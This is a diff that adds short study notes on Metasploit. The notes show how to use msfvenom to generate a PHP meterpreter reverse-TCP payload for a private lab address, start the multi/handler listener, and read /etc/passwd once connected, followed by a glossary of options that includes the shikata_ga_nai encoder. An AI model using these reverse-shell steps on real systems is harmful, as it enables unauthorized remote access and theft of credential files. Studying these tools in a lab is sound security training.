@@ -1,0 +1,46 @@
+This file is for msf venom instructions
+
+msfvenom -l payload|grep php|grep reverse_tcp
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST LPORT -o nahid.php
+msfconsole
+use exploit/multi/handler 
+options
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.160.128 LPORT=4444 -o new.php
+msfconsole
+use exploit/multi/handler
+options
+set LHOST 192.168.160.128
+set payload php/meterpreter/reverse_tcp
+options
+run 
+pwd
+ls
+cat /etc/passwd
+
+
+
+msfvenom-> used to create payloads
+msfconsole-> used to interact with and manage those payloads
+use-> Interact with a module by name or search term/index
+options-> Displays global options or for one or more modules
+set-> Sets a context-specific variable to a value
+handler-> Start a payload handler as job
+jobs-> Displays and manages jobs
+-p -> specific payload type
+LHOST-> IP address of attacker machine that works as listener
+LPORT-> Port number of the attacker machine that will listen
+-f -> spacific format of output file[like .elf for Linux, .exe for windows, .apk for android, .ps1 for powershell script]
+-e -> Specifies the encoder to use, such as shikata_ga_nai, which is commonly used for encoding payloads.
+
+
+
+
+To use a payload created with msfvenom, you will often need msfconsole to set up a listener and manage connections. For example, after creating a reverse shell payload, you would use msfconsole to listen for incoming connections 
+msfconsole
+msf > use exploit/multi/handler
+msf > set payload linux/x86/shell_reverse_tcp
+msf > set LHOST 
+msf > set LPORT 
+msf > run
